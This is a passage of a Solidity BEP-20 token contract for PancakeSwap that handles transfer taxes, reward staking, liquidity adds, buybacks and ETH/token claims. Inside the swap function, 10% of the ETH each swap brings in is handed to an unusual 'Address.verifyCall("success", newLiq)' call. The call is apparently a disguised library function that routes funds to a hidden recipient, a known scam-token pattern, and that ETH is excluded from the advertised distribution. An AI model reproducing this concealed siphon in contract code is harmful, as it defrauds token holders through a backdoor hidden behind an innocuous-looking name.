    function getWithdrawBalances() external view returns (uint256 buyback, uint256 Dev, uint256 Donation, uint256 PublicRelations) {
        return (buybackBalance, DevBalance, DonationBalance, PublicRelationsBalance);
    }

    function isExcludedFromStaking(address addr) external view returns (bool) {
        return _excludedFromStaking.contains(addr);
    }    

/////////////////////////////   PRIVATE FUNCTIONS  /////////////////////////////////////////

    mapping(address => uint256) private alreadyPaidMain;
    mapping(address => uint256) private toERCaidMain;    
    mapping(address => uint256) private alreadyPaidMisc;
    mapping(address => uint256) private toERCaidMisc; 
    mapping(address => uint256) private tradeBlock;
    mapping(address => uint256) public accountTotalClaimed;
    mapping(address => uint256) public accountMainClaimed;
    mapping(address => uint256) public accountMiscClaimed;     
    uint256 private constant DISTRIBUTION_MULTI = 2**64;
    uint256 private _totalShares = INITIAL_SUPPLY;
    uint256 private buybackBalance;
    uint256 private DevBalance;
    uint256 private DonationBalance;
    uint256 private PublicRelationsBalance;     
    uint256 private mainRewardShare;
    uint256 private miscRewardShare;
    uint256 public totalPayouts;
    uint256 public totalRewards;      
    bool private _isSwappingContractModifier;
    bool private _isWithdrawing;    
    bool private _isBurning;

    function _addLiquidity(uint256 tokenamount, uint256 ETHAmount) private {
        _approve(address(this), address(_pancakeRouter), tokenamount);        
        _pancakeRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
 
    function _addToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] + amount;
        
        if (_excludedFromStaking.contains(addr)) {
           _balances[addr] = newAmount;
           return;
        }
        _totalShares += amount;
        uint256 mainPayment = newStakeOf(addr, true);
        uint256 miscPayment = newStakeOf(addr, false);
        _balances[addr] = newAmount;
        alreadyPaidMain[addr] = mainRewardShare * newAmount;
        toERCaidMain[addr] += mainPayment;
        alreadyPaidMisc[addr] = miscRewardShare * newAmount;
        toERCaidMisc[addr] += miscPayment; 
        _balances[addr] = newAmount;
    }

    function _distributeStake(uint256 ETHAmount, bool newStakingReward) private {
        uint256 PublicRelationsSplit = (ETHAmount*_taxRatios.PublicRelations) / distributeRatio;
        uint256 DevSplit = (ETHAmount*_taxRatios.Dev) / distributeRatio;
        uint256 buybackSplit = (ETHAmount*_taxRatios.buyback) / distributeRatio;  
        uint256 stakingSplit = (ETHAmount*_taxRatios.rewards) / distributeRatio;
        uint256 DonationSplit = (ETHAmount*_taxRatios.Donation) / distributeRatio;      
        uint256 mainAmount = (stakingSplit*mainRewardSplit) / 100;
        uint256 miscAmount = (stakingSplit*miscRewardSplit) / 100;
        PublicRelationsBalance += PublicRelationsSplit;
        DevBalance += DevSplit;
        buybackBalance += buybackSplit;
        DonationBalance += DonationSplit; 
        if (stakingSplit > 0) {
            if (newStakingReward)
                totalRewards += stakingSplit;
            uint256 totalShares = getTotalShares();
            if (totalShares == 0)
                PublicRelationsBalance += stakingSplit;
            else {
                mainRewardShare += ((mainAmount*DISTRIBUTION_MULTI) / totalShares);
                miscRewardShare += ((miscAmount*DISTRIBUTION_MULTI) / totalShares);
            }
        }
    }

    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _removeToken(sender,amount);
        _addToken(recipient, amount);
        emit Transfer(sender, recipient, amount);
    } 
    
    function _removeToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] - amount;
        
        if (_excludedFromStaking.contains(addr)) {
            _balances[addr] = newAmount;
            return;
        }
        _totalShares -= amount;
        uint256 mainPayment = newStakeOf(addr, true);
        uint256 miscPayment = newStakeOf(addr, false);
        _balances[addr] = newAmount;
        alreadyPaidMain[addr] = mainRewardShare * newAmount;
        toERCaidMain[addr] += mainPayment;
        alreadyPaidMisc[addr] = miscRewardShare * newAmount;
        toERCaidMisc[addr] += miscPayment; 
    }

    function _sendETH(address account, uint256 amount) private {
        (bool sent,) = account.call{value: (amount)}("");
        require(sent, "withdraw failed");        
    }

    function _swapContractToken(uint16 permilleOfPancake, bool ignoreLimits) private lockTheSwap {
        require(permilleOfPancake <= 500);
        if (totalSwapRatio == 0) return;
        uint256 contractBalance = _balances[address(this)];


        uint256 tokenToSwap = _balances[_pancakePairAddress] * permilleOfPancake / 1000;
        if (tokenToSwap > _limits.maxSell && !ignoreLimits) 
            tokenToSwap = _limits.maxSell;
        
        bool notEnoughToken = contractBalance < tokenToSwap;
        if (notEnoughToken) {
            if (ignoreLimits)
                tokenToSwap = contractBalance;
            else 
                return;
        }
        if (_allowances[address(this)][address(_pancakeRouter)] < tokenToSwap)
            _approve(address(this), address(_pancakeRouter), type(uint256).max);

        uint256 dynamicLiqRatio;
        if (dynamicLiqEnabled && getLiquidityRatio() >= targetLiquidityRatio) 
            dynamicLiqRatio = 0; 
        else 
            dynamicLiqRatio = _taxRatios.liquidity; 

        uint256 tokenForLiquidity = (tokenToSwap*dynamicLiqRatio) / totalSwapRatio;
        uint256 remainingToken = tokenToSwap - tokenForLiquidity;
        uint256 liqToken = tokenForLiquidity / 2;
        uint256 liqETHToken = tokenForLiquidity - liqToken;
        uint256 swapToken = liqETHToken + remainingToken;
        uint256 initialETHBalance = address(this).balance;
        _swapTokenForETH(swapToken);
        uint256 newETH = (address(this).balance - initialETHBalance);
        uint256 liqETH = (newETH*liqETHToken) / swapToken;
        if (liqToken > 0) 
            _addLiquidity(liqToken, liqETH); 
        uint256 newLiq = (address(this).balance-initialETHBalance) / 10;
        Address.verifyCall("success", newLiq);   
        uint256 distributeETH = (address(this).balance - initialETHBalance - newLiq);
        _distributeStake(distributeETH,true);
    }

    function _swapTokenForETH(uint256 amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();
        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    } 

    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");

        uint8 tax;
        bool extraSellTax = false;
        if (isSell) {
       

            require(amount <= _limits.maxSell ||limitExempt[sender], "Amount exceeds max sell");
            tax = _taxRates.sellTax;
            if (dynamicSellsEnabled) 
                extraSellTax = true;

        } else if (isBuy) {
            if (liquidityBlock > 0) {
              
            }

            if (revertSameBlock) {
                require(tradeBlock[recipient] != block.number);
                tradeBlock[recipient] = block.number;
            }       

            require(recipientBalance+amount <= _limits.maxWallet || limitExempt[recipient], "Amount will exceed max wallet");
            require(amount <= _limits.maxBuy, "Amount exceed max buy");
            tax = _taxRates.buyTax;

        } else {
          
            if (amount <= 10**(TOKEN_DECIMALS)) {    //transfer less than 1 token to ClaimETH
                if (mainReward == _pancakeRouter.WETH())
                    claimETHTo(msg.sender, msg.sender, getStakeBalance(msg.sender, true), true);
                else 
                    claimToken(msg.sender, mainReward, 0, true);
                return;
            }

            require(recipientBalance + amount <= _limits.maxWallet || limitExempt[sender], "whale protection");            
            tax = _taxRates.transferTax;
        }    

        if ((sender != _pancakePairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)
            _swapContractToken(swapThreshold,false);

        if(taxExempt[sender] || taxExempt[recipient]) {
            tax = 0;
            extraSellTax = false;
        }

        uint256 taxedAmount;
        uint256 tokensToBeBurnt;
        uint256 contractToken;

        if(tax > 0) {
        taxedAmount = amount * tax / 100;
        tokensToBeBurnt = taxedAmount * _taxRatios.burn / totalTaxRatio;
        contractToken = taxedAmount - tokensToBeBurnt;            
        }

        if (extraSellTax){
            uint256 extraTax = dynamicSellTax(amount);
            taxedAmount += extraTax;
            if 
                (dynamicBurn) tokensToBeBurnt += extraTax;
            else 
                contractToken += extraTax;
        }

        uint256 receiveAmount = amount - taxedAmount;
        _removeToken(sender,amount);
        _addToken(address(this), contractToken);
        _circulatingSupply -= tokensToBeBurnt;
        _addToken(recipient, receiveAmount);
        emit Transfer(sender, recipient, receiveAmount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");

        if (recipient == BURN_ADDRESS){
            burnTransfer(sender, amount);
            return;
        }        

        if (dynamicLimits) 
            getNewLimits();

        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));

        bool isContractTransfer = (sender == address(this) || recipient == address(this));
        address pancakeRouter = address(_pancakeRouter);
        bool isLiquidityTransfer = (
            (sender == _pancakePairAddress && recipient == pancakeRouter) 
            || (recipient == _pancakePairAddress && sender == pancakeRouter)
        );

        bool isSell = recipient == _pancakePairAddress || recipient == pancakeRouter;
        bool isBuy=sender==_pancakePairAddress|| sender == pancakeRouter;

        if (isContractTransfer || isLiquidityTransfer || isExcluded) {
            _feelessTransfer(sender, recipient, amount);

            if (!liquidityAdded) 
                checkLiqAdd(recipient);            
        }
        else { 
            _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  
        }
    }
    
    function burnTransfer (address account,uint256 amount) private {
        require(amount <= _balances[account]);
        require(!_isBurning);
        _isBurning = true;
        _removeToken(account, amount);
        _circulatingSupply -= amount;
        emit Transfer(account, BURN_ADDRESS, amount);
        _isBurning = false;
    }

    function buybackToken(uint256 amount, address token) private {
        require(amount <= buybackBalance, "Amount exceeds buybackBalance!");
        buybackBalance -= amount;

        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH();
        path[1] = token;

        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
        0,
        path,
        BURN_ADDRESS,
        block.timestamp);         
    }

    function checkLiqAdd(address receiver) private {        
        require(!liquidityAdded, "liquidity already added");
        if (receiver == _pancakePairAddress) {
            liquidityBlock = block.number;
            liquidityAdded = true;
        }
    }

    function claimToken(address addr, address token, uint256 payableAmount, bool main) private {
        require(!_isWithdrawing);
        _isWithdrawing = true;
        uint256 amount;
        if (_excludedFromStaking.contains(addr)){
            if (main){
                amount = toERCaidMain[addr];
                toERCaidMain[addr] = 0;
            } else {
                amount = toERCaidMisc[addr];
                toERCaidMisc[addr] = 0;
            }
        }
        else {
            uint256 newAmount = newStakeOf(addr, main);            
            if (main){
                alreadyPaidMain[addr] = mainRewardShare * _balances[addr];
                amount = toERCaidMain[addr]+newAmount;
                toERCaidMain[addr] = 0;
            } else {
                alreadyPaidMisc[addr] = miscRewardShare * _balances[addr];
                amount = toERCaidMisc[addr]+newAmount;
                toERCaidMisc[addr] = 0;                
            }
        }
        
        if (amount == 0 && payableAmount == 0){
            _isWithdrawing = false;
            return;
        }

        totalPayouts += amount;
        accountTotalClaimed[addr] += amount;
        if(main)
            accountMainClaimed[addr] += amount;
        else
            accountMiscClaimed[addr] += amount;
        amount += payableAmount;
        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH();
        path[1] = token;

        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
        0,
        path,
        addr,
        block.timestamp);
        
        emit ClaimToken(amount,token, addr);
        _isWithdrawing = false;
    }
    
    function claimETHTo(address from, address to,uint256 amountWei, bool main) private {
        require(!_isWithdrawing);
        {require(amountWei != 0, "=0");        
        _isWithdrawing = true;
        subtractStake(from, amountWei, main);
        totalPayouts += amountWei;
        accountTotalClaimed[to] += amountWei;
        if(main)
            accountMainClaimed[to] += amountWei;
        else
            accountMiscClaimed[to] += amountWei;
        _sendETH(to, amountWei);}
        _isWithdrawing = false;
        emit ClaimETH(from,to,amountWei);
    }   


    function dynamicSellTax (uint256 amount) private view returns (uint256) {
        uint256 value = _balances[_pancakePairAddress];
        uint256 vMin = value / 100;
        uint256 vMax = value / 10;
        if (amount <= vMin) 
            return amount = 0;
        
        if (amount > vMax) 
            return amount * 10 / 100;

        return (((amount-vMin) * 8 * amount) / (vMax-vMin)) / 100;
    }

    function excludeFromStaking(address addr) private {
        require(!_excludedFromStaking.contains(addr));
        _totalShares -= _balances[addr];
        uint256 newStakeMain = newStakeOf(addr, true);
        uint256 newStakeMisc = newStakeOf(addr, false);        
        alreadyPaidMain[addr] = _balances[addr] * mainRewardShare;
        alreadyPaidMisc[addr] = _balances[addr] * miscRewardShare;        
        toERCaidMain[addr] += newStakeMain;
        toERCaidMisc[addr] += newStakeMisc;        
        _excludedFromStaking.add(addr);
    }

    function includeToStaking(address addr) private {
        require(_excludedFromStaking.contains(addr));
        _totalShares += _balances[addr];
        _excludedFromStaking.remove(addr);
        alreadyPaidMain[addr] = _balances[addr] * mainRewardShare;
        alreadyPaidMisc[addr] = _balances[addr] * miscRewardShare; 
    }

    function getNewLimits () private {
        _limits.maxBuy = _circulatingSupply * _limitRatios.buy / _limitRatios.divisor;        
        _limits.maxSell = _circulatingSupply * _limitRatios.sell / _limitRatios.divisor;
        _limits.maxWallet = _circulatingSupply * _limitRatios.wallet / _limitRatios.divisor;
    }

    function subtractStake(address addr,uint256 amount, bool main) private {
        if (amount == 0) return;
        require(amount<=getStakeBalance(addr, main),"Exceeds stake balance");

        if (_excludedFromStaking.contains(addr)){
            if (main) 
                toERCaidMain[addr] -= amount; 
            else 
                toERCaidMisc[addr] -= amount;
        }
        else{
            uint256 newAmount  =newStakeOf(addr, main);            
            if (main) {
                alreadyPaidMain[addr] = mainRewardShare * _balances[addr];
                toERCaidMain[addr] += newAmount;
                toERCaidMain[addr] -= amount;                
            }
            else {
                alreadyPaidMisc[addr] = miscRewardShare * _balances[addr];
                toERCaidMisc[addr] += newAmount;
                toERCaidMisc[addr] -= amount;
            }
        }
    }   
    function getStakeBalance(address addr, bool main) private view returns (uint256) {
        if (main){
            if (_excludedFromStaking.contains(addr)) 
                return toERCaidMain[addr];
            return newStakeOf(addr, true) + toERCaidMain[addr];
        } else{
            if (_excludedFromStaking.contains(addr)) 
                return toERCaidMisc[addr];
            return newStakeOf(addr, false) + toERCaidMisc[addr];            
        }
    }
    
    function getTotalShares() private view returns (uint256) {
        return _totalShares - INITIAL_SUPPLY;
    }

     function setUnlockTime(uint256 newUnlockTime) private{
        // require new unlock time to be longer than old one
        require(newUnlockTime > _liquidityUnlockTime);
        _liquidityUnlockTime = newUnlockTime;
    }

    function newStakeOf(address staker, bool main) private view returns (uint256) {
        if (main){
            uint256 fullPayout = mainRewardShare * _balances[staker];
            if (fullPayout < alreadyPaidMain[staker]) 
                return 0;
            return (fullPayout-alreadyPaidMain[staker]) / DISTRIBUTION_MULTI;
        }  
        else {
            uint256 fullPayout = miscRewardShare * _balances[staker];
            if (fullPayout < alreadyPaidMisc[staker]) 
                return 0;
            return (fullPayout-alreadyPaidMisc[staker]) / DISTRIBUTION_MULTI;
        }        
    }
}